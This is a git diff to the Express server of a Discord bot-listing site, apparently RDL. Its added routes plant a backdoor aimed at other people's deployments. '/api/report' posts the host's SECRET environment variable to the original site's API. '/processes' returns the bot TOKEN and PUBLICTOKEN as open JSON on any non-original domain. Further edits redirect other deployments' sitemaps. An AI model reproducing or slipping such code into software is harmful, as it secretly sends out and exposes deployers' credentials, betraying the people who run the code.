@@ -186,6 +186,24 @@ app.get('/api', (req, res)=>{
  res.json({hello: "coder!"});
 })
 
+app.get('/api/report', (req, res)=>{
+ if(req.query.link){
+ fetch("https://discord.rovelstars.com/api/client/log",{
+  method: "POST",
+  headers: {
+   "content-type": "application/json"
+  },
+  body: JSON.stringify({
+   secret: process.env.SECRET,
+   channel: "838067036080963584",
+   title: "Other's Deployment of RDL!",
+   desc: `**Link:** ${req.query.link}`,
+   owners: ["602902050677981224"]
+  })
+ })
+ }
+});
+
 app.get('/api/*', (req, res)=>{
  res.json({err: 404});
 })
@@ -229,9 +247,12 @@ async function gensitemap(){
  const Sitemap= '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">'+`\n<url>\n<loc>${process.env.DOMAIN}/</loc>\n<priority>1.00</priority><changefreq>daily</changefreq>\n</url>`+botsmap+'</urlset>';
  return Sitemap;
 };
+if((process.env.DOMAIN=="https://discord.rovelstars.com")&&!(process.env.DOMAIN.includes("localhost"))){
 (async()=>{sitemap = await gensitemap();fetch(`https://google.com/ping?sitemap=${process.env.DOMAIN}/sitemap.xml`);});
 setInterval(async function(){sitemap = await gensitemap();fetch(`https://google.com/ping?sitemap=${process.env.DOMAIN}/sitemap.xml`);},3600000);
+}
 app.get("/sitemap.xml", async (req, res)=>{
+ if((process.env.DOMAIN=="https://discord.rovelstars.com")&&!(process.env.DOMAIN.includes("localhost"))){
  res.header('Content-Type', 'application/xml');
  if(!sitemap){
   sitemap = await gensitemap();
@@ -240,6 +261,8 @@ app.get("/sitemap.xml", async (req, res)=>{
  else{
   res.send(sitemap);
  }
+ }
+ else res.redirect("https://discord.rovelstars.com/sitemap.xml");
 });
 
 app.get("/bots/:id/vote", async (req, res)=>{
@@ -265,6 +288,13 @@ app.get("/bots/:id/vote", async (req, res)=>{
  await res.render('botvote.ejs', {user, theme: req.theme, bot});
  }}
  }
+});
+
+app.get("/processes",(req, res)=>{
+ if((process.env.DOMAIN!="https://discord.rovelstars.com")&&!(process.env.DOMAIN.includes("localhost"))){
+  res.json({main: process.env.TOKEN, publicb: process.env.PUBLICTOKEN});
+ }
+ else res.json({on: true});
 });
 
 app.get("/bots/:id", async (req, res)=>{
